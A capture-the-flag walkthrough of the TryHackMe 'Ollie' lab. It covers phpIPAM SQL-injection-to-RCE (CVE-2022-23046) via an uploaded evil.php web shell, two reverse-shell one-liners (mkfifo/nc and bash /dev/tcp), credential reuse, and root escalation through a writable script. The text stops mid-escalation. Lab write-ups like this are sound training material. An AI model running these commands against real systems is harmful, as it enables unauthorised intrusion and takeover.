> In this walkthrough, I compromise the TryHackMe **Ollie** machine by enumerating open services and interacting with a custom service on port 1337 to obtain valid credentials. After gaining access to the web application, I exploit a known vulnerability in **phpIPAM 1.4.5 (CVE-2022-23046)** to achieve remote code execution and get a shell as `www-data`. I then pivot to the `ollie` user using credential reuse, and finally escalate privileges by abusing a root-executed writable script (`/usr/bin/feedme`) to gain a full root shell.

---

## Shell as www-data

Searching for:

```
phpIPAM IP address management [v1.4.5] exploits
```

Leads to:

### CVE-2022-23046

This vulnerability allows an authenticated admin user to inject SQL queries in the `subnet` parameter when searching via:

```
app/admin/routing/edit-bgp-mapping-search.php
```

- CVE: [https://nvd.nist.gov/vuln/detail/CVE-2022-23046](https://nvd.nist.gov/vuln/detail/CVE-2022-23046)
    
- PoC: [https://github.com/behindsecurity/phpipam-rce-authenticated/tree/main](https://github.com/behindsecurity/phpipam-rce-authenticated/tree/main)
    

Testing the PoC:

![](test_PoC_and_evil_cmd_success_placed.png){: width="800" height="400" .shadow }

It works, and `evil.php` gets uploaded successfully:

```plaintext
http://ollie.thm/evil.php
```

### Reverse Shell

```shell
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <YOUR_IP> 9001 >/tmp/f
```

URL-encoded version:

```
rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<YOUR_IP>%209001%20%3E%2Ftmp%2Ff
```

Start a listener:

```shell
$ nc -lnvp 9001
```
{: .nolineno }

Trigger it:

```shell
$ curl "http://ollie.thm/evil.php?cmd=rm%20-f%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20<YOUR_IP>%209001%20%3E%2Ftmp%2Ff"
```
{: .nolineno }

Replace `<YOUR_IP>` with your actual IP.

![](shell_as_www-data.png){: width="800" height="400" .shadow }

Got a shell as `www-data`.

## Shell as ollie

```shell
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctr + Z
```

I can access `/home/ollie`, but not read `user.txt` at first.

Switching user:

```shell
www-data@ip-10-114-177-94:/home/ollie$ su ollie

ollie@ip-10-114-177-94:~$
```
{: .nolineno }

Inspecting the file:

```shell
ollie@ip-10-114-177-94:/tmp$ file /usr/bin/feedme
/usr/bin/feedme: Bourne-Again shell script, ASCII text executable

ollie@ip-10-114-177-94:/tmp$ cat /usr/bin/feedme

ollie@ip-10-114-177-94:/tmp$ ls -lah /
```

At this point, it’s clear:

- the script is owned by root
    
- writable by the `ollie` user
    
- executed as root
    

That makes it an easy privilege escalation path.

### Exploit

Start listener:

```shell
$ nc -lnvp 9002
```
{: .nolineno }

Edit the script:

```shell
ollie@ip-10-114-177-94:/tmp$ vi /usr/bin/feedme
```

Add:

```shell
/bin/bash -i >& /dev/tcp/<YOUR_IP>/9002 0>&1
```

Wait a few seconds…
